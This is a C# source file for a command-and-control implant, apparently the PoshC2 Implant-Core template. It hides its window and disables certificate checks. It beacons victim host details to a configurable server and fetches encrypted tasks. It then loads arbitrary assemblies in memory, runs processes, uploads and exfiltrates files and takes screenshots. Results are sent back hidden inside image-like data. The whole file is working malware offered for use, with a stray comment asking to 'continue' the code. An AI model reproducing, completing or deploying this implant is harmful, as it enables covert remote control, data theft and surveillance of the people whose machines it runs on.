using System;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Reflection;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.IO.Compression;
using System.Collections.Generic;

//mono-csc /opt/PoshC2_Python_Git/Files/Implant-Core.cs -out:/tmp/Sharp.dll -target:library
//cat /tmp/Sharp.dll | base64 -w 0 | xclip

public class Program
{
	[DllImport("kernel32.dll")]
	static extern IntPtr GetConsoleWindow();
	[DllImport("user32.dll")]
	static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
	public const int SW_HIDE = 0;
	public const int SW_SHOW = 5;

	public static void Sharp()
	{
		var handle = GetConsoleWindow();
		ShowWindow(handle, SW_HIDE);
		AllowUntrustedCertificates();
		try { primer(); } catch {
			var mre = new System.Threading.ManualResetEvent(false);
			mre.WaitOne(300000);
			try { primer(); } catch {
				mre.WaitOne(600000);
				try { primer(); } catch { }
			}
		}
	}

	public static void Main()
	{
		Sharp();
	}

	static byte[] Combine(byte[] first, byte[] second)
	{
		byte[] ret = new byte[first.Length + second.Length];
		Buffer.BlockCopy(first, 0, ret, 0, first.Length);
		Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
		return ret;
	}

	static System.Net.WebClient GetWebRequest(string cookie)
	{
		var x = new System.Net.WebClient();

		var purl = @"#REPLACEPROXYURL#";
		var puser = @"#REPLACEPROXYUSER#";
		var ppass = @"#REPLACEPROXYPASSWORD#";

		if (!String.IsNullOrEmpty(purl))
		{
			WebProxy proxy = new WebProxy();
			proxy.Address = new Uri(purl);
			proxy.Credentials = new NetworkCredential(puser, ppass);
			proxy.UseDefaultCredentials = false;
			proxy.BypassProxyOnLocal = false;
			x.Proxy = proxy;
		} else {
			x.UseDefaultCredentials = true;
		}

		var df = "#REPLACEDF#";
		if (!String.IsNullOrEmpty(df))
			x.Headers.Add("Host", df);

		x.Headers.Add("User-Agent", "#REPLACEUSERAGENT#");
		x.Headers.Add("Referer", "#REPLACEREFERER#");

		if (null != cookie)
			x.Headers.Add(System.Net.HttpRequestHeader.Cookie, $"SessionID={cookie}");

		return x;
	}

	static string Decryption(string key, string enc)
	{
		var b = System.Convert.FromBase64String(enc);
		var IV = new Byte[16];
		Array.Copy(b, IV, 16);
		try
		{
			var a = CreateCam(key, System.Convert.ToBase64String(IV));
			var u = a.CreateDecryptor().TransformFinalBlock(b, 16, b.Length - 16);
			return System.Text.Encoding.UTF8.GetString(u);
		}
		catch
		{
			var a = CreateCam(key, System.Convert.ToBase64String(IV), false);
			var u = a.CreateDecryptor().TransformFinalBlock(b, 16, b.Length - 16);
			return System.Text.Encoding.UTF8.GetString(u);
		}
		finally
		{
			Array.Clear(b, 0, b.Length);
			Array.Clear(IV, 0, 16);
		}
	}

	static bool IsHighIntegrity()
	{
		System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
		System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
		return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
	}
	
	static string Encryption(string key, string un, bool comp = false, byte[] unByte = null)
	{
		byte[] byEnc = null;
		if (unByte != null)
			byEnc = unByte;
		else
			byEnc = System.Text.Encoding.UTF8.GetBytes(un);
		
		if (comp)
			byEnc = Compress(byEnc);

		try
		{
			var a = CreateCam(key, null);
			var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
			return System.Convert.ToBase64String(Combine(a.IV, f));
		}
		catch
		{
			var a = CreateCam(key, null, false);
			var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
			return System.Convert.ToBase64String(Combine(a.IV, f));
		}
	}

	static System.Security.Cryptography.SymmetricAlgorithm CreateCam(string key, string IV, bool rij = true)
	{
		System.Security.Cryptography.SymmetricAlgorithm a = null;
		if (rij)
			a = new System.Security.Cryptography.RijndaelManaged();
		else
			a = new System.Security.Cryptography.AesCryptoServiceProvider();

		a.Mode = System.Security.Cryptography.CipherMode.CBC;
		a.Padding = System.Security.Cryptography.PaddingMode.Zeros;
		a.BlockSize = 128;
		a.KeySize = 256;
  
		if (null != IV)
			a.IV = System.Convert.FromBase64String(IV);
		else
			a.GenerateIV();

		if (null != key)
			a.Key = System.Convert.FromBase64String(key);

		return a;
	}
	static void AllowUntrustedCertificates()
	{
		try
		{
			System.Net.ServicePointManager.ServerCertificateValidationCallback = (z, y, x, w) => { return true; };
		}
		catch { }
	}

	static void primer()
	{
		if (Convert.ToDateTime("#REPLACEKILLDATE#") > DateTime.Now)
		{
			var u = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
			if (IsHighIntegrity())
			  u += "*";
			var dn = System.Environment.UserDomainName;
			var cn = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
			var arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
			int pid = Process.GetCurrentProcess().Id;
			Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
			var o = $"{dn};{u};{cn};{arch};{pid};#REPLACEBASEURL#";
			String key = "#REPLACEKEY#", baseURL = "#REPLACEBASEURL#", s = "#REPLACESTARTURL#";

			var primer = GetWebRequest(Encryption(key, o)).DownloadString(s);
			var x = Decryption(key, primer);

			var re = new Regex("RANDOMURI19901(.*)10991IRUMODNAR");
			var m = re.Match(x);
			string RandomURI = m.Groups[1].ToString();

			re = new Regex("URLS10484390243(.*)34209348401SLRU");
			m = re.Match(x);
			string URLS = m.Groups[1].ToString();

			re = new Regex("KILLDATE1665(.*)5661ETADLLIK");
			m = re.Match(x);
			var KillDate = m.Groups[1].ToString();

			re = new Regex("SLEEP98001(.*)10089PEELS");
			m = re.Match(x);
			var Sleep = m.Groups[1].ToString();

			re = new Regex("NEWKEY8839394(.*)4939388YEKWEN");
			m = re.Match(x);
			var NewKey = m.Groups[1].ToString();

			re = new Regex("IMGS19459394(.*)49395491SGMI");
			m = re.Match(x);
			var IMGs = m.Groups[1].ToString();

			ImplantCore(baseURL, RandomURI, URLS, KillDate, Sleep, NewKey, IMGs);
		}
	}

	static byte[] Compress(byte[] raw)
	{
    using (MemoryStream memory = new MemoryStream())
    {
      using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
      {
        gzip.Write(raw, 0, raw.Length);
      }
      return memory.ToArray();
    }
	}
	
	static Type LoadSomething(string assemblyQualifiedName)
	{
		return Type.GetType(assemblyQualifiedName, (name) =>
		   {
			   return AppDomain.CurrentDomain.GetAssemblies().Where(z => z.FullName == name.FullName).FirstOrDefault();
		   }, null, true);
	}
	
	static string RunAssembly(string c)
	{
		var splitargs = c.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
		int i = 0;
		string sOut = null;
		bool runexe = true;
		string sMethod = "", splittheseargs = "", qualifiedname = "", name = "";
		foreach (var a in splitargs)
		{
			if (i == 1)
				qualifiedname = a;
			if (i == 2)
				name = a;

			if (c.ToLower().StartsWith("run-exe")) {
				if (i > 2)
					splittheseargs = splittheseargs + " " + a;
			} else {
				if (i == 3)
					sMethod = a;
				else if (i > 3)
					splittheseargs = splittheseargs + " " + a;
			}
			i++;
		}
		var splitnewargs = splittheseargs.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
		foreach (var Ass in AppDomain.CurrentDomain.GetAssemblies())
		{
			if (Ass.FullName.ToString().ToLower().StartsWith(name.ToLower()))
			{
				var loadedType = LoadSomething(qualifiedname + ", " + Ass.FullName);
				try
				{
					if (c.ToLower().StartsWith("run-exe"))
						sOut = loadedType.Assembly.EntryPoint.Invoke(null, new object[] { splitnewargs }).ToString();
					else
					{
						try
						{
							sOut = loadedType.Assembly.GetType(qualifiedname).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] { splitnewargs }).ToString();
						}
						catch
						{
							var asOut = loadedType.Assembly.GetType(qualifiedname).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null).ToString();
						}
					}
				}
				catch { }
			}
		}
		return sOut;
	}

	static int Parse_Beacon_Time(string time, string unit)
	{
		int beacontime = Int32.Parse(time);
		switch (unit)
		{
			case "h":
				beacontime *= 3600;
				break;
			case "m":
				beacontime *= 60;
				break;
		}
		return beacontime;
	}
	
	internal static class UrlGen
	{
		static List<String> _stringnewURLS = new List<String>();
		static String _randomURI;
		static String _baseUrl;
		static Random _rnd = new Random();
		static Regex _re = new Regex("(?<=\")[^\"]*(?=\")|[^\" ]+", RegexOptions.Compiled);
		internal static void Init(string stringURLS, String RandomURI, String baseUrl)
		{
			_stringnewURLS = _re.Matches(stringURLS.Replace(",", "").Replace(" ", "")).Cast<Match>().Select(m => m.Value).Where(m => !string.IsNullOrEmpty(m)).ToList();
			_randomURI = RandomURI;
			_baseUrl = baseUrl;
		}
	
		internal static String GenerateUrl()
		{
			string URL = _stringnewURLS[_rnd.Next(_stringnewURLS.Count)];
			return $"{_baseUrl}/{URL}{Guid.NewGuid()}/?{_randomURI}";
		}
	}
	
	internal static class ImgGen
	{
		static Random _rnd = new Random();
		static Regex _re = new Regex("(?<=\")[^\"]*(?=\")|[^\" ]+", RegexOptions.Compiled);
		static List<String> _newImgs = new List<String>();
		
		internal static void Init(String stringIMGS)
		{
			var stringnewIMGS = _re.Matches(stringIMGS.Replace(",", "")).Cast<Match>().Select(m => m.Value);
			stringnewIMGS = stringnewIMGS.Where(m => !string.IsNullOrEmpty(m));
      _newImgs = stringnewIMGS.ToList();
		}

		static string RandomString(int length)
		{
			const string chars = "...................@..........................Tyscf";
			return new string(Enumerable.Repeat(chars, length).Select(s => s[_rnd.Next(s.Length)]).ToArray());
		}
		
		internal static byte[] GetImgData(byte[] cmdoutput)
		{
			Int32 maxByteslen = 1500, maxDatalen = cmdoutput.Length + maxByteslen;
			var randimg = _newImgs[(new Random()).Next(0, _newImgs.Count)];
			var imgBytes = System.Convert.FromBase64String(randimg);
			var BytePadding = System.Text.Encoding.UTF8.GetBytes((RandomString(maxByteslen - imgBytes.Length)));
			var ImageBytesFull = new byte[maxDatalen];
	
			System.Array.Copy(imgBytes, 0, ImageBytesFull, 0, imgBytes.Length);
			System.Array.Copy(BytePadding, 0, ImageBytesFull, imgBytes.Length, BytePadding.Length);
			System.Array.Copy(cmdoutput, 0, ImageBytesFull, imgBytes.Length + BytePadding.Length, cmdoutput.Length);
			return ImageBytesFull;
		}
	}
	
	static void ImplantCore(string baseURL, string RandomURI, string stringURLS, string KillDate, string Sleep, string Key, string stringIMGS)
	{
		UrlGen.Init(stringURLS, RandomURI, baseURL);
		ImgGen.Init(stringIMGS);
		int beacontime = 5;
		var ibcnRgx = new Regex(@"(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.Compiled | RegexOptions.IgnoreCase);
		var imch = ibcnRgx.Match(Sleep);
		if (imch.Success)
		{
			beacontime = Parse_Beacon_Time(imch.Groups["t"].Value, imch.Groups["u"].Value);
		}
	
		var strOutput = new StringWriter();
		Console.SetOut(strOutput);
		var exitvt = new ManualResetEvent(false);
		var output = new StringBuilder();
		while (!exitvt.WaitOne((int)(beacontime * 1000 * (((new Random()).Next(0, 2) > 0) ? 1.05 : 0.95))))
		{
			if (Convert.ToDateTime(KillDate) < DateTime.Now)
			{
				exitvt.Set();
				continue;
			}
			output.Length = 0;
			try
			{
				String x = "", cmd = null;
				try
				{
					cmd = GetWebRequest(null).DownloadString(UrlGen.GenerateUrl());
					x = Decryption(Key, cmd).Replace("\0", string.Empty);
				}
				catch
				{
					continue;
				} //CAN YOU CONTINUE FROM THIS POINT?
	
				if (x.ToLower().StartsWith("multicmd"))
				{
					var splitcmd = x.Replace("multicmd", "");
					var split = splitcmd.Split(new string[] { "!d-3dion@LD!-d" }, StringSplitOptions.RemoveEmptyEntries);
					foreach (string c in split)
					{
						var taskId = c.Substring(0, 5);
						cmd = c.Substring(5, c.Length - 5);
						if (cmd.ToLower().StartsWith("exit"))
						{
							exitvt.Set();
							break;
						}
						else if (cmd.ToLower().StartsWith("loadmodule"))
						{
							var module = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
							var assembly = System.Reflection.Assembly.Load(System.Convert.FromBase64String(module));
						}
						else if (cmd.ToLower().StartsWith("upload-file"))
						{
							var path = Regex.Replace(cmd, "upload-file", "", RegexOptions.IgnoreCase);
							var splitargs = path.Split(new string[] { ";" }, StringSplitOptions.RemoveEmptyEntries);
							Console.WriteLine("Uploaded file to: " + splitargs[1]);
							var fileBytes = Convert.FromBase64String(splitargs[0]);
							System.IO.File.WriteAllBytes(splitargs[1].Replace("\"", ""), fileBytes);
						}
						else if (cmd.ToLower().StartsWith("download-file"))
						{
							var path = Regex.Replace(cmd, "download-file ", "", RegexOptions.IgnoreCase);
							var file = File.ReadAllBytes(path.Replace("\"", ""));
							var fileChuck = Combine(Encoding.ASCII.GetBytes("0000100001"), file);
	
							var eTaskId = Encryption(Key, taskId);
							var dcoutput = Encryption(Key, "", true, fileChuck);
							var doutputBytes = System.Convert.FromBase64String(dcoutput);
							var dsendBytes = ImgGen.GetImgData(doutputBytes);
							GetWebRequest(eTaskId).UploadData(UrlGen.GenerateUrl(), dsendBytes);
							continue;
						}
						else if (cmd.ToLower().StartsWith("get-screenshotmulti"))
						{
							bool sShot = true;
							int sShotCount = 1;
							while(sShot) {
								var sHot = RunAssembly("run-exe Core.Program Core get-screenshot");
								var eTaskId = Encryption(Key, taskId);
								var dcoutput = Encryption(Key, strOutput.ToString(), true);
								var doutputBytes = System.Convert.FromBase64String(dcoutput);
								var dsendBytes = ImgGen.GetImgData(doutputBytes);
								GetWebRequest(eTaskId).UploadData(UrlGen.GenerateUrl(), dsendBytes);
								Thread.Sleep(240000);
								sShotCount++;
								if (sShotCount > 100) {
									sShot = false;
									var sbc = strOutput.GetStringBuilder();
									sbc.Remove(0, sbc.Length);
									output.Append("[+] Multi Screenshot Ran Sucessfully");
								}
							}
							continue;
						}
						else if (cmd.ToLower().StartsWith("listmodules"))
						{
							var appd = AppDomain.CurrentDomain.GetAssemblies();
							output.AppendLine("[+] Modules loaded:").AppendLine("");
							foreach (var ass in appd)
								output.AppendLine(ass.FullName.ToString());
						}
						else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
						{
							output.AppendLine(RunAssembly(cmd));
						}
						else if (cmd.ToLower().StartsWith("start-process"))
						{
							var proc = cmd.Replace("'", "").Replace("\"", "");
							var pstart = Regex.Replace(proc, "start-process ", "", RegexOptions.IgnoreCase);
							pstart = Regex.Replace(pstart, "-argumentlist(.*)", "", RegexOptions.IgnoreCase);
							var args = Regex.Replace(proc, "(.*)argumentlist ", "", RegexOptions.IgnoreCase);
							var p = new Process();
							p.StartInfo.UseShellExecute = false;
							p.StartInfo.RedirectStandardOutput = p.StartInfo.RedirectStandardError = p.StartInfo.CreateNoWindow = true;
							p.StartInfo.FileName = pstart;
							p.StartInfo.Arguments = args;
							p.Start();
							output.AppendLine(p.StandardOutput.ReadToEnd()).AppendLine(p.StandardError.ReadToEnd());
							p.WaitForExit();
						}
						else if (cmd.ToLower().StartsWith("setbeacon") || cmd.ToLower().StartsWith("beacon"))
						{
							var bcnRgx = new Regex(@"(?<=(setbeacon|beacon)\s{1,})(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.Compiled | RegexOptions.IgnoreCase);
							var mch = bcnRgx.Match(c);
							if (mch.Success)
							{
								beacontime = Parse_Beacon_Time(mch.Groups["t"].Value, mch.Groups["u"].Value);
							}
							else
								output.AppendLine($@"[X] Invalid time ""{c}""");
						}
	
						output.AppendLine(strOutput.ToString());
						var sb = strOutput.GetStringBuilder();
						sb.Remove(0, sb.Length);
						var enTaskId = Encryption(Key, taskId);
						var coutput = Encryption(Key, output.ToString(), true);
						var outputBytes = System.Convert.FromBase64String(coutput);
						var sendBytes = ImgGen.GetImgData(outputBytes);
						GetWebRequest(enTaskId).UploadData(UrlGen.GenerateUrl(), sendBytes);
					}
				}
			}
			catch (Exception e)
			{
				var task = Encryption(Key, "Error");
				var eroutput = Encryption(Key, $"Error: {output.ToString()} {e}", true);
				var outputBytes = System.Convert.FromBase64String(eroutput);
				var sendBytes = ImgGen.GetImgData(outputBytes);
				GetWebRequest(task).UploadData(UrlGen.GenerateUrl(), sendBytes);
			}
		}
	}
}
